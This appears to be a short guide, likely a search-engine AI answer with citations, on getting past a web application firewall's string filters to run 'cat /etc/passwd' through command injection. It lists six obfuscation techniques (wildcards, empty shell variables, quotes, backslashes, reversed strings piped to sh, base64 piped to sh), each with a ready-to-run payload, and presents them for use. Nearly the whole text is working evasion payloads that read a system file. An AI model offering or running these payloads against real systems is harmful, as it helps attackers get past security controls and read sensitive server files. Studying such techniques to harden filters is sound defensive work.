When a Web Application Firewall (WAF) blocks the literal string cat /etc/passwd, it is usually relying on regex-based string matching. You can bypass these string-matching filters in a Linux terminal or command injection environment using several obfuscation techniques. [1, 2, 3] 
## 1. Globbing and Wildcards
Linux shells automatically expand wildcards. You can avoid typing the exact blocked words by substituting characters with ? (matches any single character) or * (matches zero or more characters). [1, 2] 
```
/bin/c?t /e?c/p?sswd
/usr/bin/c*t /et*/pass*
```
## 2. Uninitialized Shell Variables [4] 
In Bash, a variable that has not been defined evaluates to an empty string. Inserting it breaks up the literal keyword signature for the WAF without changing how the command executes in Linux. [5, 6, 7] 
```
cat$u /etc$u/passwd$u
c$a\t /et$c/pass$w\d
```
## 3. Quote Insertion
You can place single (') or double (") quotes inside the command name or file path. The shell strips the quotes before executing the command, but the WAF sees a fragmented string. [8, 9] 
```
c'a't /e't'c/p'a'sswd
ca"t" /"e"tc/p"a"sswd
```
## 4. Character Escaping (Backslashes)
A backslash (\) escapes the next character. When placed in the middle of a command or file path, it splits the keyword signature for the WAF while remaining perfectly valid in Linux. [10] 
```
c\a\t /e\t\c/p\a\s\s\w\d
```
## 5. String Reversal and Inversion
You can feed a reversed string into the terminal and reverse it back inline using rev before execution. This completely hides cat and /etc/passwd from text filters.
```
echo "dwssap/cte/ tac" | rev | sh
```
## 6. Base64 Encoding [3] 
Encoding the payload changes the binary signature into safe alphanumeric text. This prevents the WAF from matching string-based filters entirely. [3, 10] 

# Payload: cat /etc/passwd encoded to Base64
```
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | sh
```

[1] [https://medium.com](https://medium.com/@themiddleblue/waf-evasion-techniques-718026d693d8)
[2] [https://www.exploit-db.com](https://www.exploit-db.com/docs/english/43946-web-application-firewall-%28waf%29-evasion-techniques.pdf)
[3] [https://bugbase.ai](https://bugbase.ai/blog/top-10-ways-to-bypass-waf)
[4] [https://medium.com](https://medium.com/@mbdogrusoz/how-can-i-bypass-the-waf-7e12ccfc56f5)
[5] [https://www.secjuice.com](https://www.secjuice.com/web-application-firewall-waf-evasion/)
[6] [https://www.arridae.com](https://www.arridae.com/blogs/WAF-evasion-Technique-3.php)
[7] [https://medium.com](https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2)
[8] [https://medium.com](https://medium.com/@themiddleblue/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
[9] [https://www.exploit-db.com](https://www.exploit-db.com/docs/english/45368-web-application-firewall-%28waf%29-evasion-techniques-3.pdf)
[10] [https://nemesida-waf.medium.com](https://nemesida-waf.medium.com/waf-bypass-or-find-out-about-your-waf-flaws-before-an-attacker-does-92c84d361cf6)
